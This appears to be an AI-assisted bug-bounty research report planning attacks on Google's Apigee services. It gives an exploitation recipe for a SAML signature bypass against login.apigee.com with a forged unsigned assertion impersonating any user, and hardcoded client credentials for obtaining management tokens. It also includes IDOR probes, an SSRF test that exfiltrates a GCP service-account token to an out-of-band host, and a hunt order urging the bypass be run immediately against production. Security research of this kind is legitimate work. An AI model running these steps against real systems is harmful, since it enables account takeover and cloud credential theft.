# Apigee Deep Research Report
**Generated:** 2026-06-20
**Purpose:** Inform next hunt session on Apigee (Google VRP)

---

## Executive Summary

Three confirmed testable attack vectors ranked by likelihood of a payable Google VRP finding:

| Rank | Vector | CVE | CVSS | Auth Required | Patch Status |
|------|--------|-----|------|---------------|-------------|
| 1 | UAA SAML 2.0 Signature Bypass | CVE-2026-22734 | 8.6 | None | Fixed in UAA v78.9.0+ |
| 2 | Management API authenticated IDOR / privilege probe | (no CVE) | TBD | Test account | Unknown |
| 3 | SetIntegrationRequest SSRF (Apigee X) | CVE-2026-2264 | High | Org access | Fixed in 1-17-0-apigee-7 |

---

## Vector 1: CVE-2026-22734 — UAA SAML 2.0 Signature Bypass (CRITICAL)

### What It Is
CloudFoundry UAA versions **v77.21.0 through v78.8.0** accept SAML 2.0 bearer assertions that are neither signed nor encrypted when `grant_type=urn:ietf:params:oauth:grant-type:saml2-bearer` is used. An attacker can forge an unsigned SAML assertion for **any user** and obtain their OAuth access token — without knowing their password.

### Attack Requirements
- Network access to `login.apigee.com/oauth/token`
- A client_id with `saml2-bearer` grant type enabled
- The UAA version must be v77.21.0-v78.8.0

### Exploitation Steps (if version in range)
```
1. POST https://login.apigee.com/oauth/token
   -d "grant_type=urn:ietf:params:oauth:grant-type:saml2-bearer"
   -d "assertion=<base64-encoded-unsigned-SAML-XML>"
   -d "client_id=<client_with_saml2bearer_enabled>"
   -u "client_id:client_secret"
```
Minimal unsigned SAML XML:
```xml
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  Version="2.0" ID="id1" IssueInstant="2026-06-20T00:00:00Z">
  <saml:Issuer>https://attacker.com/saml</saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
      target@example.com
    </saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData
        Recipient="https://login.apigee.com/oauth/token"
        NotOnOrAfter="2026-06-21T00:00:00Z"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
</saml:Assertion>
```

### How to Check Version
```bash
curl -sk https://login.apigee.com/info | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('app',{}).get('version',''))"
```

### Key Unknowns
- Actual UAA version running on login.apigee.com (check `/info`)
- Whether any client has `saml2-bearer` grant type enabled (check `/saml/metadata` for registered SPs)
- If SAML bearer is NOT enabled for any client → exploit is not possible even on affected version

### Sources
- [SentinelOne CVE-2026-22734](https://www.sentinelone.com/vulnerability-database/cve-2026-22734/)
- [CloudFoundry Blog](https://www.cloudfoundry.org/blog/cve-2026-22734-uaa-saml-2-0-signature-bypass/)
- [TheHackerWire Analysis](https://www.thehackerwire.com/cloud-foundry-uaa-saml-bypass-token-theft/)

---

## Vector 2: Management API Authenticated IDOR / Privilege Probe

### What It Is
The Apigee Edge management API (`api.enterprise.apigee.com/v1/`) is a REST API that manages orgs, users, proxies, and products. With a valid OAuth token obtained via password grant using public client credentials, we can probe for:
- Cross-user data access on `/v1/users/{email}` (IDOR)
- Unauthorized org listing via `/v1/organizations`
- Role escalation via `/v1/userroles`

### Token Acquisition (Confirmed Working Method)
```bash
# Public client credentials for Apigee management API (used by all Maven plugins)
CLIENT_ID="edgecli"
CLIENT_SECRET="edgeclisecret"

curl -X POST "https://login.apigee.com/oauth/token" \
  -u "${CLIENT_ID}:${CLIENT_SECRET}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&username=YOUR_EMAIL&password=YOUR_PASS&response_type=token"
```
Returns: `{"access_token":"...","token_type":"bearer","expires_in":43199,...}`

### IDOR Test Endpoints
```bash
# Own profile (baseline)
GET /v1/users/{your_email}

# Another user's profile (IDOR probe - single request only per CLAUDE.md §7)
GET /v1/users/{known_public_apigee_user@example.com}

# List all organizations (should be restricted - auth bypass if returns all)
GET /v1/organizations

# List all users globally (should 403 - Sysadmin only)
GET /v1/users
```

### Apigee Management API Base URL
`https://api.enterprise.apigee.com`

### Prior Art
- No public IDOR writeup found for `/v1/users` — **UNTESTED SURFACE**
- Google VRP has rewarded header injection, sandbox bypasses on Apigee management surface
- GatewayToHeaven (CVE-2025-13292) shows Google rewards cross-tenant data access bugs

### Sources
- [Apigee Management API Docs](https://docs.apigee.com/api-platform/system-administration/management-api-overview)
- [apigee-config-maven-plugin (confirms edgecli:edgeclisecret)](https://github.com/apigee/apigee-config-maven-plugin)
- [Google VRP Rewards Page](https://bughunters.google.com/reports/vrp/wJPJcyy9h/report)

---

## Vector 3: CVE-2026-2264 — SetIntegrationRequest SSRF + SA Token Exfil (Apigee X)

### What It Is
Published **May 20, 2026** (very recent). The `SetIntegrationRequest` policy in Apigee X/hybrid does not validate the `IntegrationRegion` parameter when it comes from a flow variable. If any API proxy maps user input (query param, header) to the `IntegrationRegion`, an attacker can redirect the Integration invocation to their server and receive the **GCP service account token** in the Authorization header.

### Patch Status
- Fixed in: `1-17-0-apigee-7` (May 12, 2026) and Apigee hybrid `v1.15.4` (May 30, 2026)
- Attack surface: Any Apigee X org running older version OR any implementation where user input reaches `IntegrationRegion`

### What to Test
1. Sign up for Apigee X free trial org (cloud.google.com/apigee/docs/api-platform/get-started/create-account)
2. Create a proxy with `SetIntegrationRequest` policy:
   ```xml
   <SetIntegrationRequest name="sir">
     <IntegrationRegion>{request.queryparam.region}</IntegrationRegion>
   </SetIntegrationRequest>
   ```
3. Deploy proxy, call it with `?region=https://YOURHOST.oast.pro/`
4. Check OOB server for service account token in Authorization header
5. If received → confirm SSRF, then escalate with the SA token

### Why This is High Signal
- Very recently patched (May 2026) — patch bypasses are common
- SSRF → GCP SA token = CRITICAL chain (data exfil, lateral movement in GCP)
- Similar policy validation gaps may exist in other integration-related policies
- **Look for:** `SetIntegrationRequest`, `AssertCondition`, `SetIntegrationParam` in other proxies

### Sources
- [CISA Vulnerability Bulletin sb26-131](https://www.cisa.gov/news-events/bulletins/sb26-131)
- [Apigee Security Bulletins](https://cloud.google.com/apigee/docs/security-bulletins/security-bulletins)

---

## Background Intelligence

### Historical Google VRP Apigee Findings (Confirmed Paid)
- **Sandbox Bypass (Rhino)**: JavaCallout policy → RCE bypassing ClassShutter. Paid.
- **Header Injection**: Remote attacker can inject arbitrary headers when calling target systems. Paid.
- **AppSheet SSRF via Apigee API key**: Adding Apigee account source in AppSheet → SSRF to third-party URL. Paid (our F002/F003 findings!).
- **GatewayToHeaven (CVE-2025-13292)**: Cross-tenant read/write of analytics + access logs with JWT tokens. CRITICAL. Paid.
- **JavaCallout RCE (CVE-2025-13426)**: Malicious object injection into MessageContext → RCE. CVSS 8.7. Patched March 2025.

### What DOES NOT Get Paid
- Information disclosure via verbose error messages (without exploitable chain)
- CORS misconfiguration on non-sensitive endpoints
- Missing headers on static pages
- Rate limiting issues without demonstrated bypass

### UAA Token Revocation Bypass (CVE-2026-22723)
- Token revocation endpoint has logic error — revoked tokens may still be valid
- Fixed in UAA v78.8.0
- **Test:** Get token, POST to `/oauth/token/revoke/{jti}`, reuse token → if 200, confirmed

### Discourse (community.apigee.com)
- Running v2026.6.0-latest — PATCHED against CVE-2026-30889 (fixed in 2026.3.0)
- No current unpatched N-day
- **DROP: Discourse surface has no viable attack vector**

---

## Recommended Hunt Order

```
[NOW - Pi, no auth needed]
1. scripts/apigee_uaa_check.sh → version + SAML endpoint fingerprint
   → If v77.21-v78.8: run scripts/apigee_saml_bypass.sh IMMEDIATELY

[Pi, with test account]
2. scripts/apigee_mgmt_token.sh → get OAuth token via edgecli:edgeclisecret
3. scripts/apigee_mgmt_idor.sh → probe /v1/users/ IDOR + /v1/organizations

[Apigee X trial org needed]
4. Sign up for Apigee X trial → scripts/apigee_x_ssrf_test.sh
   → Test CVE-2026-2264 SetIntegrationRequest SSRF + bypass variants
```
